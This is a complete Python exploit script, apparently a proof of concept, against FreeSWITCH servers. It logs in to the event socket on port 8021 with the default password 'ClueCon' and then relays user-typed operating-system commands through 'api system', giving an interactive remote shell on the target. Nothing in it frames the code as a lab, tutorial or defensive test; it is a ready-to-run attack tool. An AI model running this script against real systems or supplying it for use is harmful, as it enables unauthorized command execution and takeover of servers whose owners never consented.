#!/usr/bin/python3

from socket import *
import sys

if len(sys.argv) != 2:
    print('Missing target address')
    print('Usage: freeswitch-exploit.py <target>')
    sys.exit(1)

ADDRESS = sys.argv[1]
PASSWORD = 'ClueCon'  # default password for FreeSWITCH

# Connect to the FreeSWITCH server
s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b'auth/request' in response:
    # Authenticate with the server
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    
    if b'+OK accepted' in response:
        print('Authenticated')
        
        # Keep prompting the user for commands until they type 'exit'
        while True:
            CMD = input('Enter command (or type "exit" to quit): ')
            
            if CMD.lower() == 'exit':
                print('Exiting...')
                break
            
            # Send the command to the server
            s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
            response = s.recv(8096).decode()
            print(response)
    else:
        print('Authentication failed')
        sys.exit(1)
else:
    print('Not prompted for authentication, likely not vulnerable')
    sys.exit(1)
